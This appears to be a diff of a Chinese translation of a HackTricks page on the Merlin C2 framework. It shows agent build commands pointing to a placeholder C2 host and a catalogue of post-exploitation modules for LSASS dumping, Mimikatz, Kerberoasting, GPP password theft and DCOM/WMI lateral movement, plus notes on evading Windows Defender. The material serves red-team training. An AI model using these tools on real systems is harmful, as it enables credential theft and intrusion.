@@ -1,14 +1,14 @@
 <details>
 
-<summary><strong>零基础学习AWS黑客攻击成为高手</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS红队专家)</strong></a><strong>！</strong></summary>
+<summary><strong>从零开始学习AWS黑客技术，成为专家，使用</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>
 
-支持HackTricks的其他方式：
+其他支持HackTricks的方式：
 
-* 如果您想在**HackTricks上看到您的公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
-* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
-* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
-* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在**Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
-* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。
+* 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
+* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
+* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
+* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**。**
+* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。
 
 </details>
 
@@ -39,7 +39,7 @@ go run cmd/merlinserver/main.go -i
 ```
 # Merlin 代理
 
-您可以[下载预编译的代理](https://github.com/Ne0nd0g/merlin/releases)
+您可以[下载预编译代理](https://github.com/Ne0nd0g/merlin/releases)
 
 ## 编译代理
 
@@ -50,59 +50,59 @@ make #Server and Agents of all
 make windows #Server and Agents for Windows
 make windows-agent URL=https://malware.domain.com:443/ #Agent for windows (arm, dll, linux, darwin, javascript, mips)
 ```
-## **手动编译代理**
+## **手动编译代理程序**
 ```
 GOOS=windows GOARCH=amd64 go build -ldflags "-X main.url=https://10.2.0.5:443" -o agent.exe main.g
 ```
 # 模块
 
-**坏消息是，Merlin 使用的每个模块都是从源头（Github）下载并在使用前保存到磁盘的。使用知名模块时要小心，因为 Windows Defender 会抓到你！**
+**坏消息是Merlin使用的每个模块都是从源（Github）下载并保存在磁盘上才能使用。在使用知名模块时要小心，因为Windows Defender会抓到你！**
 
 
-**SafetyKatz** --> 修改版 Mimikatz。转储 LSASS 到文件并启动：sekurlsa::logonpasswords 到该文件\
-**SharpDump** --> 为指定的进程 ID 创建 minidump（默认为 LSASS）（它说最终文件的扩展名是 .gz，但实际上是 .bin，但是一个 gz 文件）\
-**SharpRoast** --> Kerberoast（不工作）\
-**SeatBelt** --> CS 中的本地安全测试（不工作） https://github.com/GhostPack/Seatbelt/blob/master/Seatbelt/Program.cs\
-**Compiler-CSharp** --> 使用 csc.exe /unsafe 编译\
-**Sharp-Up** -->C# 中的所有检查在 powerup 中（工作）\
-**Inveigh** --> PowerShell ADIDNS/LLMNR/mDNS/NBNS 欺骗器和中间人工具（不工作，需要加载：https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1）\
-**Invoke-InternalMonologue** --> 冒充所有可用用户并检索每个用户的挑战响应（每个用户的 NTLM 哈希）（错误的 url）\
-**Invoke-PowerThIEf** --> 从 IExplorer 偷窃表单或使其执行 JS 或在该进程中注入 DLL（不工作）（PS 看起来也不工作） https://github.com/nettitude/Invoke-PowerThIEf/blob/master/Invoke-PowerThIEf.ps1\
-**LaZagneForensic** --> 获取浏览器密码（工作但不打印输出目录）\
-**dumpCredStore** --> Win32 凭据管理器 API（https://github.com/zetlen/clortho/blob/master/CredMan.ps1） https://www.digitalcitizen.life/credential-manager-where-windows-stores-passwords-other-login-details\
-**Get-InjectedThread** --> 检测运行中进程的经典注入（经典注入（OpenProcess，VirtualAllocEx，WriteProcessMemory，CreateRemoteThread））（不工作）\
-**Get-OSTokenInformation** --> 获取运行中进程和线程的令牌信息（用户，组，权限，所有者... https://docs.microsoft.com/es-es/windows/desktop/api/winnt/ne-winnt-\_token_information_class）\
-**Invoke-DCOM** --> 通过 DCOM 在其他计算机上执行命令（http://www.enigma0x3.net.）（https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/）\
-**Invoke-DCOMPowerPointPivot** --> 在其他 PC 上利用 PowerPoint COM 对象执行命令（ADDin）\
-**Invoke-ExcelMacroPivot** --> 在其他 PC 上利用 DCOM 在 Excel 中执行命令\
-**Find-ComputersWithRemoteAccessPolicies** --> （不工作）（https://labs.mwrinfosecurity.com/blog/enumerating-remote-access-policies-through-gpo/）\
-**Grouper** --> 它转储所有最有趣的组策略部分，然后在其中寻找可利用的东西。（已弃用）看看 Grouper2，看起来真的不错\
-**Invoke-WMILM** --> WMI 用于横向移动\
-**Get-GPPPassword** --> 寻找 groups.xml，scheduledtasks.xml，services.xml 和 datasources.xml 并返回明文密码（域内）\
-**Invoke-Mimikatz** --> 使用 mimikatz（默认转储凭据）\
+**SafetyKatz** --> 修改版的Mimikatz。将LSASS转储到文件并运行:sekurlsa::logonpasswords到该文件\
+**SharpDump** --> 为指定的进程ID进行minidump（默认为LSASS）（最终文件的扩展名是.gz，但实际上是.bin，是一个gz文件）\
+**SharpRoast** --> Kerberoast（不起作用）\
+**SeatBelt** --> 在CS中进行本地安全测试（不起作用）https://github.com/GhostPack/Seatbelt/blob/master/Seatbelt/Program.cs\
+**Compiler-CSharp** --> 使用csc.exe /unsafe进行编译\
+**Sharp-Up** --> 在powerup中使用C#进行所有检查（有效）\
+**Inveigh** --> PowerShellADIDNS/LLMNR/mDNS/NBNS欺骗器和中间人工具（不起作用，需要加载：https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1）\
+**Invoke-InternalMonologue** --> 模拟所有可用用户并为每个用户检索挑战-响应（每个用户的NTLM哈希）（坏的URL）\
+**Invoke-PowerThIEf** --> 从IExplorer窃取表单或使其执行JS或在该进程中注入DLL（不起作用）（PS似乎也不起作用）https://github.com/nettitude/Invoke-PowerThIEf/blob/master/Invoke-PowerThIEf.ps1\
+**LaZagneForensic** --> 获取浏览器密码（有效，但不打印输出目录）\
+**dumpCredStore** --> Win32凭据管理器API（https://github.com/zetlen/clortho/blob/master/CredMan.ps1）https://www.digitalcitizen.life/credential-manager-where-windows-stores-passwords-other-login-details\
+**Get-InjectedThread** --> 检测运行进程中的经典注入（经典注入（OpenProcess，VirtualAllocEx，WriteProcessMemory，CreateRemoteThread））（不起作用）\
+**Get-OSTokenInformation** --> 获取正在运行的进程和线程的令牌信息（用户、组、特权、所有者... https://docs.microsoft.com/es-es/windows/desktop/api/winnt/ne-winnt-\_token_information_class）\
+**Invoke-DCOM** --> 通过DCOM执行命令（在其他计算机上）（http://www.enigma0x3.net.）（https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/）\
+**Invoke-DCOMPowerPointPivot** --> 滥用PowerPoint COM对象（ADDin）在其他PC中执行命令\
+**Invoke-ExcelMacroPivot** --> 滥用Excel中的DCOM在其他PC中执行命令\
+**Find-ComputersWithRemoteAccessPolicies** -->（不起作用）（https://labs.mwrinfosecurity.com/blog/enumerating-remote-access-policies-through-gpo/）\
+**Grouper** --> 它转储组策略的所有最有趣的部分，然后在其中寻找可利用的内容（已弃用）看看Grouper2，看起来非常好\
+**Invoke-WMILM** --> 使用WMI进行横向移动\
+**Get-GPPPassword** --> 查找groups.xml，scheduledtasks.xml，services.xml和datasources.xml并返回明文密码（在域内）\
+**Invoke-Mimikatz** --> 使用mimikatz（默认转储凭据）\
 **PowerUp** --> https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc\
-**Find-BadPrivilege** --> 检查计算机中用户的权限\
-**Find-PotentiallyCrackableAccounts** --> 检索与 SPN 关联的用户账户信息（Kerberoasting）\
+**Find-BadPrivilege** --> 检查计算机用户的特权\
+**Find-PotentiallyCrackableAccounts** --> 检索与SPN相关联的用户帐户的信息（Kerberoasting）\
 **psgetsystem** --> 获取系统
 
 **未检查持久性模块**
 
-# 总结
+# 简介
 
 我真的很喜欢这个工具的感觉和潜力。\
-我希望这个工具将开始从服务器下载模块，并在下载脚本时整合某种规避手段。
+希望该工具开始从服务器下载模块并在下载脚本时集成某种逃避机制。
 
 
 <details>
 
-<summary><strong>从零开始学习 AWS 黑客攻击直到成为英雄，通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>！</strong></summary>
+<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>
 
-支持 HackTricks 的其他方式：
+支持HackTricks的其他方式：
 
-* 如果你想在 **HackTricks** 中看到你的**公司广告**或**下载 HackTricks 的 PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
-* 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
-* 发现[**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs 集合**](https://opensea.io/collection/the-peass-family)
-* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
-* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享你的黑客技巧。
+* 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
+* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
+* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[NFTs](https://opensea.io/collection/the-peass-family)收藏品
+* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或在**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**上关注**我们。
+* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。
 
 </details>
